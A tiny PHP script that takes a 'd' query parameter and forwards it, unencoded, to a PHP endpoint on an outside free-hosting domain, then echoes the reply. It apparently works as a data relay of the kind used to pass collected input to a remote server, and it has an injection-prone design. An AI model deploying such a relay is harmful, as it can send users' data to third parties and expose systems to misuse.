<?php
  $data = (isset($_GET['d']) ? trim($_GET['d']) : "");
  echo file_get_contents("https://job.eu5.org/mod/set.php?d=".$data);
?>
